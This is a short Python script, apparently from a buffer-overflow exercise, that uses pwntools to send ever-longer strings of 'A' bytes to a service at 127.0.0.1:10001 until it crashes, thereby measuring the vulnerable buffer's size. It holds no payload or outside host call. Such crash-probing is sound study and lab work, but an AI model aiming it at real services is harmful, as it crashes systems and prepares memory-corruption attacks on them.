from pwn import *

def get_buf_size():
    size = 0
    
    # keep incrementing size
    while 1:
        try:
            payload = b'A' * (size + 1)
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("Buffer size not %d" % size)
            size += 1
        
        # until the server crashes
        except Exception:
            p.close()
            return size

size = get_buf_size()
print("The buf size is", size)
